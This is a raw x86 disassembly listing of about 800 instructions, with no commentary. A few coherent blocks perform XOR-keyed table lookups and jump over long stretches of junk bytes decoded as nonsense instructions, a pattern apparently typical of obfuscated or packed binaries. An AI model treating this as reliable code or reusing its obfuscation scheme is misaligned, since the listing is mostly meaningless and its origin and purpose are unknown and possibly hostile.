  404a9e:	mov    ds:0x45b6c5ad,al
  404aa3:	mov    BYTE PTR [edi],bh
  404aa5:	aas    
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xdf3c6a28
  404b32:	sbb    dl,BYTE PTR [edx-0x6d]
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b78
  404b3e:	lds    eax,FWORD PTR [esi]
  404b40:	jbe    0x404b53
  404b42:	cwde   
  404b43:	rcl    DWORD PTR [eax],0xeb
  404b46:	sbb    BYTE PTR [ebx-0x79bf2e1a],0xe2
  404b4d:	push   0xb13208ea
  404b52:	loopne 0x404b79
  404b54:	or     edx,DWORD PTR [ebx-0x16]
  404b57:	xor    ebx,DWORD PTR [ecx]
  404b59:	and    BYTE PTR [esi-0x1f],cl
  404b5c:	icebp  
  404b5d:	jge    0x404b9a
  404b5f:	ret    
  404b60:	dec    ebx
  404b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b62:	out    0x65,al
  404b64:	cwde   
  404b65:	or     DWORD PTR [esi],edx
  404b67:	stos   BYTE PTR es:[edi],al
  404b68:	pushf  
  404b69:	out    dx,al
  404b6a:	popa   
  404b6b:	sub    ebx,DWORD PTR [edx+0x4c]
  404b6e:	je     0x404bbe
  404b70:	dec    ebp
  404b71:	mov    ch,0xda
  404b73:	jmp    0x404b9f
  404b75:	ss pop ss
  404b77:	mov    ds:0x4e21ba28,al
  404b7c:	mov    cs,WORD PTR [ebx+0x5d8fcdbd]
  404b82:	retf   0x88d3
  404b85:	pop    esi
  404b86:	retf   
  404b87:	add    dl,BYTE PTR [eax-0x72]
  404b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8b:	ficomp WORD PTR [ebp+esi*4-0x1f51b35e]
  404b92:	push   ss
  404b93:	js     0x404b86
  404b95:	ficomp DWORD PTR [eax+0x52]
  404b98:	xchg   BYTE PTR ds:0xcad4a4b2,al
  404b9e:	and    edx,DWORD PTR [edi-0x30bd5c95]
  404ba4:	xchg   BYTE PTR [edi],ch
  404ba6:	sbb    ch,BYTE PTR [eax+ebx*2-0x48]
  404baa:	sbb    ebp,esi
  404bac:	jl     0x404b94
  404bae:	push   eax
  404baf:	pop    ebp
  404bb0:	add    al,0x33
  404bb2:	stc    
  404bb3:	pop    ecx
  404bb4:	mov    ebx,0xe2d21d8e
  404bb9:	call   0x763ebbf3
  404bbe:	push   edx
  404bbf:	sub    eax,ebx
  404bc1:	call   0x2d44:0x6e556773
  404bc8:	retf   0xf14d
  404bcb:	xor    bh,ch
  404bcd:	cmp    edi,DWORD PTR [ecx]
  404bcf:	sbb    bl,BYTE PTR [esi-0x4598e4f4]
  404bd5:	inc    ebp
  404bd6:	push   cs
  404bd7:	jno    0x404bdb
  404bd9:	xor    al,0x66
  404bdb:	aaa    
  404bdc:	xchg   edi,ecx
  404bde:	mov    cl,0xa2
  404be0:	mov    ch,BYTE PTR [esi-0xa8ffdb2]
  404be6:	and    edi,ebp
  404be8:	fisub  DWORD PTR [edi+0x3b25f68a]
  404bee:	inc    esi
  404bef:	or     edx,esi
  404bf1:	imul   esp,DWORD PTR [ebp-0x4f],0x853a2f08
  404bf8:	cmp    al,0x73
  404bfa:	gs iret 
  404bfc:	and    ecx,ebx
  404bfe:	ss cmp eax,0x1990c1bb
  404c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c05:	fcomp  DWORD PTR [ebx]
  404c07:	cld    
  404c08:	mov    DWORD PTR [edx+0x5],eax
  404c0b:	jmp    0xc064fceb
  404c10:	push   ebp
  404c11:	pop    DWORD PTR [edi-0x6]
  404c14:	hlt    
  404c15:	aaa    
  404c16:	outs   dx,DWORD PTR ds:[esi]
  404c17:	leave  
  404c18:	pop    ds
  404c19:	cmp    al,0x51
  404c1b:	pop    edx
  404c1c:	cmc    
  404c1d:	stos   BYTE PTR es:[edi],al
  404c1e:	(bad)  
  404c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c20:	mov    ds:0xd46e5114,eax
  404c25:	dec    ebp
  404c26:	mov    bh,BYTE PTR [esi+esi*1-0x5c]
  404c2a:	lods   eax,DWORD PTR ds:[esi]
  404c2b:	jnp    0x404bf1
  404c2d:	daa    
  404c2e:	in     al,0x42
  404c30:	push   ebp
  404c31:	jp     0x404c79
  404c33:	inc    eax
  404c34:	xchg   ecx,eax
  404c35:	and    eax,0x467bc5cb
  404c3a:	sahf   
  404c3b:	arpl   WORD PTR [esi-0x2c],bx
  404c3e:	ins    DWORD PTR es:[edi],dx
  404c3f:	je     0x404bdc
  404c41:	cmp    al,0x75
  404c43:	scas   al,BYTE PTR es:[edi]
  404c44:	mov    DWORD PTR [ecx+0x2090bf7f],esp
  404c4a:	das    
  404c4b:	mov    edi,0x2a53dd10
  404c50:	pop    ecx
  404c51:	mov    eax,ds:0xa31f9351
  404c56:	mov    ch,0xf0
  404c58:	mov    eax,ds:0x65696a32
  404c5d:	xchg   ebp,eax
  404c5e:	into   
  404c5f:	outs   dx,DWORD PTR ds:[esi]
  404c60:	add    BYTE PTR gs:[edi+0x34],ch
  404c64:	sti    
  404c65:	push   0x3ccbf249
  404c6a:	(bad)  
  404c6b:	adc    esp,DWORD PTR [ebx*4-0x3d26550d]
  404c72:	enter  0x9d5b,0x87
  404c76:	cdq    
  404c77:	icebp  
  404c78:	and    ah,BYTE PTR [ebp-0x57c66f20]
  404c7e:	xor    al,0x47
  404c80:	jecxz  0x404c25
  404c82:	jp     0x404c0c
  404c84:	pop    ecx
  404c85:	sub    DWORD PTR [ebp-0x14],ebx
  404c88:	pop    ebp
  404c89:	std    
  404c8a:	mov    DWORD PTR [edx+0x7564844c],ebx
  404c90:	sub    DWORD PTR [esp+edx*1-0xc40f8ec],edi
  404c97:	and    al,0xf4
  404c99:	xchg   ebx,eax
  404c9a:	pop    ss
  404c9b:	jo     0x404c99
  404c9d:	mov    ebx,?
  404c9f:	jne    0x404cdd
  404ca1:	aas    
  404ca2:	inc    edi
  404ca3:	mov    esi,edx
  404ca5:	jl     0x404c92
  404ca7:	mov    bl,0xcc
  404ca9:	jmp    0x404cbb
  404cab:	adc    eax,0x11ad16e1
  404cb0:	and    eax,0x1a69bd4a
  404cb5:	mov    eax,0x49d39d06
  404cba:	cdq    
  404cbb:	dec    ecx
  404cbc:	adc    eax,0x8a8469c7
  404cc1:	mov    edx,0xd1390c77
  404cc6:	fsubr  QWORD PTR [edx]
  404cc8:	cmp    bh,dl
  404cca:	mov    ebp,0xf9f5752c
  404ccf:	sbb    esp,0xffffffb4
  404cd2:	stc    
  404cd3:	xchg   DWORD PTR [eax-0x6adc3e54],ebx
  404cd9:	fadd   QWORD PTR [ebx-0x38517195]
  404cdf:	imul   esp,DWORD PTR [eax],0x2a8802e9
  404ce5:	pop    eax
  404ce6:	outs   dx,DWORD PTR ds:[esi]
  404ce7:	(bad)  
  404ce8:	je     0x404cac
  404cea:	push   esp
  404ceb:	jae    0x404d2b
  404ced:	out    dx,al
  404cee:	in     eax,0x4d
  404cf0:	fcomp  DWORD PTR [edx]
  404cf2:	adc    bh,dh
  404cf4:	sbb    eax,edi
  404cf6:	inc    edi
  404cf7:	inc    esi
  404cf8:	vpsrlw ymm1,ymm0,XMMWORD PTR [ecx-0x41]
  404cfd:	lods   al,BYTE PTR ds:[esi]
  404cfe:	sub    eax,0x508d16c8
  404d03:	sbb    al,0xe2
  404d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d06:	add    DWORD PTR [ebp+0x74],esi
  404d09:	ins    BYTE PTR es:[edi],dx
  404d0a:	jb     0x404d2f
  404d0c:	cmp    eax,DWORD PTR [esp+esi*4]
  404d0f:	or     eax,0xf3cdfc2d
  404d14:	push   es
  404d15:	scas   eax,DWORD PTR es:[edi]
  404d16:	fld    TBYTE PTR [edx+0x20af543b]
  404d1c:	dec    ebp
  404d1d:	xchg   esi,eax
  404d1e:	cmp    al,BYTE PTR [eax+0x7ff5ad49]
  404d24:	sbb    BYTE PTR [ebp+0x22],al
  404d27:	dec    ecx
  404d28:	in     al,0xeb
  404d2a:	xchg   esp,eax
  404d2b:	cdq    
  404d2c:	xchg   edx,eax
  404d2d:	pop    edi
  404d2e:	mov    ebp,0xead1249d
  404d33:	mov    al,0x42
  404d35:	cmp    al,0x58
  404d37:	xchg   ebp,eax
  404d38:	xchg   DWORD PTR [edx-0x429347b8],esp
  404d3e:	jno    0x404d50
  404d40:	dec    ebx
  404d41:	frstor [esi+0x22]
  404d44:	xchg   ebx,eax
  404d45:	sub    bh,bl
  404d47:	dec    esp
  404d48:	stos   BYTE PTR es:[edi],al
  404d49:	xor    eax,0xf64661db
  404d4e:	rcr    BYTE PTR [ebp-0x4f02c205],cl
  404d54:	inc    esp
  404d55:	pop    esi
  404d56:	cli    
  404d57:	push   ss
  404d58:	ficomp WORD PTR [ebx-0x14]
  404d5b:	inc    ebx
  404d5c:	outs   dx,BYTE PTR ds:[esi]
  404d5d:	ret    0xb3b4
  404d60:	push   esp
  404d61:	rcr    DWORD PTR [eax-0x6d],0x32
  404d65:	into   
  404d66:	cmp    al,dh
  404d68:	pushf  
  404d69:	cdq    
  404d6a:	push   0x58
  404d6c:	xor    eax,0x904ab02f
  404d71:	aaa    
  404d72:	adc    edx,DWORD PTR [ebx+0x42]
  404d75:	daa    
  404d76:	test   al,0xd8
  404d78:	and    bl,BYTE PTR [edx-0x56]
  404d7b:	fistp  DWORD PTR [ebp+0x1c]
  404d7e:	sbb    al,0x4
  404d80:	dec    ebx
  404d81:	xor    edi,edx
  404d83:	dec    ebp
  404d84:	ja     0x404d73
  404d86:	fadd   QWORD PTR [edx]
  404d88:	(bad)  
  404d89:	adc    eax,0xc3269739
  404d8e:	mov    ah,0xb7
  404d90:	bound  esp,QWORD PTR [ebp-0x5a]
  404d93:	push   cs
  404d94:	jmp    0x900c6e8e
  404d99:	arpl   WORD PTR [ebx],dx
  404d9b:	or     eax,0x2729f7b6
  404da0:	mov    esp,0x12ad9e82
  404da5:	sbb    ah,bl
  404da7:	in     al,0x21
  404da9:	aam    0xf0
  404dab:	stos   BYTE PTR es:[edi],al
  404dac:	stos   DWORD PTR es:[edi],eax
  404dad:	pusha  
  404dae:	stos   DWORD PTR es:[edi],eax
  404daf:	xchg   edx,eax
  404db0:	push   es
  404db1:	jno    0x404e0d
  404db3:	ficomp DWORD PTR [ecx]
  404db5:	das    
  404db6:	rol    DWORD PTR [edi-0x7d97c242],cl
  404dbc:	inc    al
  404dbe:	jmp    0x9f97b172
  404dc3:	call   0xfd9cc5b1
  404dc8:	(bad)  
  404dc9:	imul   ecx
  404dcb:	and    eax,0x31a87839
  404dd0:	adc    eax,0xcb411bc1
  404dd5:	cmp    BYTE PTR [edi],bh
  404dd7:	ds inc eax
  404dd9:	inc    esi
  404dda:	sti    
  404ddb:	or     BYTE PTR [esi-0x1e],al
  404dde:	mov    al,0xeb
  404de0:	jbe    0x404dee
  404de2:	ja     0x404df1
  404de4:	in     eax,0xf2
  404de6:	sar    ebp,1
  404de8:	(bad)  
  404de9:	scas   eax,DWORD PTR es:[edi]
  404dea:	sbb    BYTE PTR [edx],ah
  404dec:	mov    eax,ds:0x91c14de0
  404df1:	and    BYTE PTR [edi-0x6f],cl
  404df4:	push   eax
  404df5:	adc    dh,BYTE PTR [eax+0x45838390]
  404dfb:	and    edi,esi
  404dfd:	lods   eax,DWORD PTR ds:[esi]
  404dfe:	stos   DWORD PTR es:[edi],eax
  404dff:	dec    eax
  404e00:	das    
  404e01:	or     edi,DWORD PTR [esi+0x7ca4d350]
  404e07:	pop    es
  404e08:	pop    ecx
  404e09:	sbb    DWORD PTR [ebx+edx*8+0x46e4773f],esi
  404e10:	add    eax,0x28214d55
  404e15:	imul   eax,DWORD PTR [edi-0x2d],0xe554a44e
  404e1c:	sbb    BYTE PTR ds:0xc344ae24,ah
  404e22:	inc    esp
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e04
  404e5e:	push   ebp
  404e5f:	loop   0x404ec5
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404ebf
  404e6a:	and    eax,0x7e5e05b2
  404e6f:	push   ss
  404e70:	push   ebp
  404e71:	test   bl,0x2d
  404e74:	adc    cl,BYTE PTR [ebp+eiz*1-0x7c699560]
  404e7b:	jmp    0x404e80
  404e7d:	test   eax,0xd803486d
  404e82:	or     eax,0x8
  404e85:	mov    dl,0xaa
  404e87:	jle    0x404e66
  404e89:	push   ebp
  404e8a:	retf   0xdb6b
  404e8d:	xchg   esi,eax
  404e8e:	and    dl,BYTE PTR [edx-0x4f]
  404e91:	sub    ebx,DWORD PTR [ecx]
  404e93:	or     eax,0x2a0905e7
  404e98:	in     al,dx
  404e99:	mov    bh,dl
  404e9b:	stos   BYTE PTR es:[edi],al
  404e9c:	jle    0x404ee2
  404e9e:	mov    DWORD PTR [eax-0x1d82782],0x8e568b79
  404ea8:	add    ecx,DWORD PTR [eax-0x374de42d]
  404eae:	retf   
  404eaf:	outs   dx,DWORD PTR ds:[esi]
  404eb0:	sbb    eax,0xafd76ff7
  404eb5:	mov    cl,0xeb
  404eb7:	int    0x81
  404eb9:	call   0xf8ad42f3
  404ebe:	imul   ecx,eax,0xcb068aed
  404ec4:	in     al,dx
  404ec5:	aad    0x23
  404ec7:	test   BYTE PTR [edi-0x7b],dl
  404eca:	ins    DWORD PTR es:[edi],dx
  404ecb:	ja     0x404e80
  404ecd:	sbb    BYTE PTR [ecx+0x6d],dl
  404ed0:	out    dx,eax
  404ed1:	inc    ebx
  404ed2:	test   DWORD PTR [esi+0xb],esi
  404ed5:	pop    esi
  404ed6:	sbb    al,BYTE PTR [edi+eiz*1+0x4eb89dce]
  404edd:	fmul   QWORD PTR [eax+0x62dc5d5a]
  404ee3:	leave  
  404ee4:	stos   DWORD PTR es:[edi],eax
  404ee5:	jno    0x404f5e
  404ee7:	and    al,0xb3
  404ee9:	inc    esi
  404eea:	and    eax,0x635f2211
  404eef:	mov    DWORD PTR [esi],esi
  404ef1:	(bad)  
  404ef2:	aam    0xb0
  404ef4:	sbb    BYTE PTR [ebx],0x94
  404ef7:	mov    BYTE PTR [ebp+0x52],bh
  404efa:	jbe    0x404ebb
  404efc:	dec    eax
  404efd:	push   eax
  404efe:	adc    edi,edx
  404f00:	faddp  st(0),st
  404f02:	into   
  404f03:	outs   dx,DWORD PTR ds:[esi]
  404f04:	add    cl,BYTE PTR [edi+ecx*4-0x1befe7ef]
  404f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f0d:	sbb    ebp,DWORD PTR [ecx+0x4d]
  404f10:	rcr    ebp,0x9e
  404f13:	sub    al,0xb4
  404f15:	sub    eax,0x658e1b6
  404f1a:	inc    ecx
  404f1b:	xchg   esp,eax
  404f1c:	mov    ecx,DWORD PTR [esi+0x6fdd6b79]
  404f22:	mov    esp,0x1fc43d6f
  404f27:	fsubr  DWORD PTR [ebx-0x49]
  404f2a:	(bad)  
  404f2b:	pop    eax
  404f2c:	arpl   WORD PTR [edx],dx
  404f2e:	stos   BYTE PTR es:[edi],al
  404f2f:	retf   
  404f30:	aas    
  404f31:	dec    ebx
  404f32:	push   cs
  404f33:	xchg   esp,eax
  404f34:	ss icebp 
  404f36:	inc    edi
  404f37:	sbb    DWORD PTR [ecx+0x812e5b7],ecx
  404f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f3e:	fwait
  404f3f:	push   ebp
  404f40:	mov    ds:0xa259c2c0,al
  404f45:	repz test DWORD PTR [edi-0x7],ebp
  404f49:	inc    edx
  404f4a:	mov    al,0x85
  404f4c:	imul   ecx,DWORD PTR [edx+0x79],0x450ede47
  404f53:	mov    esi,0xb95aec6
  404f58:	mov    al,0xd7
  404f5a:	adc    eax,0xa6f56ad5
  404f5f:	fs popf 
  404f61:	adc    DWORD PTR [ecx-0x21],0xffffff8c
  404f65:	out    0xc6,eax
  404f67:	neg    DWORD PTR [eax-0x46]
  404f6a:	add    eax,ebx
  404f6c:	add    eax,0x9884ad07
  404f71:	add    eax,0xab165f5a
  404f76:	xchg   esp,eax
  404f77:	dec    ebx
  404f78:	mov    eax,ds:0xa1b30a88
  404f7d:	push   ebp
  404f7e:	frstor [esi-0x1490d7ec]
  404f84:	mov    edx,0x4bd63d5
  404f89:	cdq    
  404f8a:	pcmpgtd mm6,QWORD PTR [edi+ecx*1-0xa5dfe8a]
  404f92:	in     al,dx
  404f93:	ins    DWORD PTR es:[edi],dx
  404f94:	mov    esp,DWORD PTR [esi+ebp*4+0x5d9a7913]
  404f9b:	push   es
  404f9c:	add    al,0xa8
  404f9e:	lahf   
  404f9f:	mov    ds:0xb7306ba1,eax
  404fa4:	enter  0xf2d7,0xff
  404fa8:	out    0x7e,al
  404faa:	xchg   BYTE PTR [edi+0x1f2f4110],ah
  404fb0:	lahf   
  404fb1:	ja     0x404f92
  404fb3:	retf   
  404fb4:	ss test al,0x96
  404fb7:	rol    bl,1
  404fb9:	les    esp,FWORD PTR [esi]
  404fbb:	fild   WORD PTR [edi-0x78]
  404fbe:	daa    
  404fbf:	or     ch,dh
  404fc1:	pop    edi
  404fc2:	pop    ds
  404fc3:	in     eax,dx
  404fc4:	cmp    edx,DWORD PTR [eax]
  404fc6:	rcr    BYTE PTR [eax],0x79
  404fc9:	xor    eax,0xdf64dd91
  404fce:	ja     0x40500d
  404fd0:	mov    cl,BYTE PTR [eax+0x0]
  404fd3:	cmp    DWORD PTR [edi-0x2564e2cd],ebx
  404fd9:	xor    edi,DWORD PTR [esp+esi*2]
  404fdc:	popa   
  404fdd:	mov    dh,0x31
  404fdf:	pop    ss
  404fe0:	cmp    dl,BYTE PTR [edx]
  404fe2:	pop    es
  404fe3:	mov    ecx,0x602f31bd
  404fe8:	sar    bl,0xf1
  404feb:	fistp  WORD PTR [ebx+0x5b]
  404fee:	push   ss
  404fef:	dec    ebx
  404ff0:	push   edx
  404ff1:	loopne 0x40501d
  404ff3:	int3   
  404ff4:	fwait
  404ff5:	loopne 0x404fab
  404ff7:	cmp    BYTE PTR [esi+0x2b],cl
  404ffa:	dec    esp
  404ffb:	or     BYTE PTR [esi],ah
  404ffd:	xchg   BYTE PTR [ebx+0x7b4d3007],ch
  405003:	jne    0x404fe9
  405005:	aas    
  405006:	arpl   WORD PTR [edi-0x27],di
  405009:	fwait
  40500a:	pop    eax
  40500b:	mov    edx,gs
  40500d:	(bad)  
  40500e:	mov    ds:0x91c758ac,eax
  405013:	in     al,0xda
  405015:	sub    DWORD PTR [ebx],0x7c
  405018:	mov    edx,0xd411f8c6
  40501d:	(bad)  
  40501e:	or     ecx,DWORD PTR [edx-0x2c9e70e7]
  405024:	add    DWORD PTR [ebp+0x77c1cd75],esi
  40502a:	inc    ecx
  40502b:	repz sbb esi,DWORD PTR [ecx]
  40502e:	popf   
  40502f:	dec    ebp
  405030:	clc    
  405031:	mov    ebp,0x1b03779c
  405036:	mov    fs,ebx
  405038:	sub    edi,DWORD PTR [esi+ebx*2]
  40503b:	push   ds
  40503c:	hlt    
  40503d:	pop    esi
  40503e:	mov    ebp,0x2801e2d4
  405043:	mov    BYTE PTR [ebx-0x2c],0x81
  405047:	add    al,0xc3
  405049:	push   esp
  40504a:	(bad)  
  40504b:	inc    esi
  40504c:	and    esi,DWORD PTR [edi+edi*8-0x5d728054]
  405053:	sbb    dh,BYTE PTR [ebp+0x40a09546]
  405059:	dec    eax
  40505a:	call   0xd9c6:0x64e112cb
  405061:	ror    BYTE PTR ds:0xc116ad71,cl
  405067:	add    al,0xd0
  405069:	or     al,0x69
  40506b:	and    dl,ah
  40506d:	lock push edx
  40506f:	call   0x2e23f763
  405074:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405076:	outs   dx,BYTE PTR ds:[esi]
  405077:	test   al,bh
  405079:	fst    QWORD PTR [edi-0x47]
  40507c:	sub    dh,BYTE PTR [eax+0x3]
  40507f:	lock and al,BYTE PTR [esi]
  405082:	add    eax,ecx
  405084:	xchg   edx,eax
  405085:	sub    edx,DWORD PTR [esi+0x5abfd282]
  40508b:	movzx  edi,bx
  40508e:	aad    0x6d
  405090:	popa   
  405091:	xchg   esp,eax
  405092:	nop
  405093:	popa   
  405094:	mov    al,0x75
  405096:	aam    0x9e
  405098:	lods   eax,DWORD PTR ds:[esi]
  405099:	cmp    eax,0x3b337708
  40509e:	push   eax
  40509f:	or     eax,0x443a9504
  4050a4:	aas    
  4050a5:	cmp    DWORD PTR [ebx],eax
  4050a7:	mov    edx,0x89e09140
  4050ac:	add    eax,0x33954850
  4050b1:	adc    ebp,esi
  4050b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b4:	div    DWORD PTR [ebx*1-0x70a2eb31]
  4050bb:	arpl   WORD PTR [ebx+0x17],dx
  4050be:	xchg   BYTE PTR [edi-0x67f8ffa6],cl
  4050c4:	mov    ebp,0x793aa024
  4050c9:	xchg   ebp,eax
  4050ca:	cs adc al,0x73
  4050cd:	daa    
  4050ce:	lods   al,BYTE PTR ds:[esi]
  4050cf:	icebp  
  4050d0:	sbb    al,0xfe
  4050d2:	cs mov eax,fs
  4050d5:	mov    edi,0x760d303e
  4050da:	addr16 mov ah,0xb0
  4050dd:	add    edx,DWORD PTR [ecx-0x8]
  4050e0:	outs   dx,BYTE PTR ds:[esi]
  4050e1:	std    
  4050e2:	add    BYTE PTR [eax+0x68],bh
  4050e5:	and    BYTE PTR [ebx+0x7e5cf9e6],0xd3
  4050ec:	adc    DWORD PTR [esi-0x1578da98],0xffffffd0
  4050f3:	leave  
  4050f4:	int    0xa9
  4050f6:	aad    0xac
  4050f8:	jo     0x405114
  4050fa:	and    dl,cl
  4050fc:	js     0x4050d7
  4050fe:	push   es
  4050ff:	(bad)  
  405100:	in     al,0x4
  405102:	retf   0xff40
  405105:	and    al,0xf4
  405107:	fstp   DWORD PTR [edi-0x33]
  40510a:	mov    bh,0xa5
  40510c:	rcl    BYTE PTR [esi],cl
  40510e:	or     BYTE PTR [ecx+0x45],bh
  405111:	pop    ebx
  405112:	lds    ebx,FWORD PTR [ebp-0x28]
  405115:	mov    al,ds:0xef6471f0
  40511a:	(bad)
  40511d:	retf   
  40511e:	push   edx
  40511f:	sub    eax,0xce47b0e1
  405124:	nop
  405125:	jae    0x4050b6
  405127:	push   0x90f44504
  40512c:	out    0xec,al
  40512e:	ja     0x4050f2
  405130:	or     BYTE PTR [eax],dh
  405132:	sbb    DWORD PTR [ebx],ebp
  405134:	or     BYTE PTR [ebx-0x53],dl
  405137:	idiv   DWORD PTR [ebx+0x2]
  40513a:	or     eax,ebp
  40513c:	cld    
  40513d:	mov    gs,WORD PTR [edx+0x1f]
  405140:	xor    edx,eax
  405142:	inc    edx
  405143:	xor    al,BYTE PTR [ebx+0x14]
  405146:	mov    eax,0x2b98107d
  40514b:	sub    ebx,DWORD PTR [esi+eiz*1]
  40514e:	inc    esi
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	and    edi,DWORD PTR [edi+0x2cf6ffc0]
  405177:	jle    0x4051f7
  405179:	pop    eax
  40517a:	jl     0x4051fa
  40517c:	jle    0x405165
  40517e:	jb     0x4051a4
  405180:	pop    esi
  405181:	mov    esp,0x9be14851
  405186:	jmp    0xc329:0xf8ada989
  40518d:	popa   
  40518e:	out    dx,al
  40518f:	and    eax,DWORD PTR [eax+edx*8]
  405192:	retf   
  405193:	pop    edx
  405194:	repz adc eax,0x1642847
  40519a:	or     dh,BYTE PTR [ebx]
  40519c:	jecxz  0x405210
  40519e:	adc    DWORD PTR [esi],ebx
  4051a0:	mov    dl,0x82
  4051a2:	icebp  
  4051a3:	fdivr  st,st(7)
  4051a5:	pop    DWORD PTR [ebp-0x4c]
  4051a8:	cwde   
  4051a9:	fwait
  4051aa:	mov    ebx,0x18a9f671
  4051af:	(bad)  
  4051b0:	fisttp DWORD PTR [edi+0x7d]
  4051b3:	xchg   al,dl
  4051b5:	cmp    ebx,ebp
  4051b7:	xchg   DWORD PTR [ebx+0x286878cc],ecx
  4051bd:	inc    ebx
  4051be:	cmp    BYTE PTR [edx+0x57c6cdea],ah
  4051c4:	or     ch,BYTE PTR [ebx+ebx*2+0x10]
  4051c8:	adc    BYTE PTR [ecx],dh
  4051ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051cb:	adc    esp,DWORD PTR [eax+0x5e18e858]
  4051d1:	arpl   WORD PTR [edi+0x7b],bx
  4051d4:	out    0x60,al
  4051d6:	out    dx,al
  4051d7:	icebp  
  4051d8:	out    0xcf,eax
  4051da:	jo     0x40515f
  4051dc:	int    0x65
  4051de:	arpl   WORD PTR [ecx],dx
  4051e0:	pop    esi
  4051e1:	lock imul edi,DWORD PTR [edx-0x41710bdf],0x3bae0799
  4051ec:	and    cl,ch
  4051ee:	sub    eax,0xfd9e4afc
  4051f3:	imul   ecx,DWORD PTR [ecx+0x1e54ce14],0x8d83ac89
  4051fd:	mov    eax,0x7d623072
  405202:	rol    DWORD PTR [eax+ecx*2-0x7dc33f85],cl
  405209:	jnp    0x4051ae
  40520b:	adc    esp,DWORD PTR [edx-0x63]
  40520e:	pusha  
  40520f:	test   al,0xcf
  405211:	fbld   TBYTE PTR [ecx+0x2bad8941]
  405217:	es mov edx,ecx
  40521a:	dec    eax
  40521b:	lock loope 0x4051c0
  40521e:	repnz into 
  405220:	fsubr  QWORD PTR [esi+esi*2]
  405223:	add    al,0x16
  405225:	push   esi
  405226:	jmp    0x89c577fc
  40522b:	(bad)  
  40522c:	repz pushf 
  40522e:	jg     0x40527b
  405230:	add    BYTE PTR [edx],cl
  405232:	addr16 retf 0xf73
  405236:	jns    0x405277
  405238:	xor    DWORD PTR [ebp-0x20],edi
  40523b:	ret    
  40523c:	inc    esi
  40523d:	mov    eax,0x6ab4dfd
  405242:	cwde   
  405243:	push   ds
  405244:	or     al,0x44
  405247:	fdiv   DWORD PTR [ebx-0x33609b02]
  40524d:	or     esp,DWORD PTR [eax+0x377f67b2]
  405253:	movntq (bad),mm3
  405254:	out    0xd8,eax
  405256:	inc    eax
  405257:	fcomp  st(7)
  405259:	cmp    dh,BYTE PTR [esi+0x77b73e50]
  40525f:	mov    esi,0xa0de4263
  405264:	mov    ebp,0xd9614b2a
  405269:	cmc    
